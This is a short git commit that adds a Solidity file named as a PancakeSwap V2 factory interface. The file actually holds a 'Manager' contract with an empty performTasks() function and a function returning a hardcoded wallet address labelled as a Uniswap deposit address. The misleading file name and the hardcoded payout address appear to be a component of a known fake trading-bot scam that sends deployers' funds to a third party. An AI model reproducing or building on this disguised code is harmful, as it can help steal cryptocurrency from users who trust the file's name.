23062ea8442594f4f18fee13c64d1eef3cf4bc8a
PancakeDeveloper <96142477+PancakeDeveloper@users.noreply.github.com>
2021-12-14 10:46:14 -0800

    Add files via upload

---
+++ contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x834E7F891627125f06E908C27BeE71FbbCe7Ab27;
+	}
+}
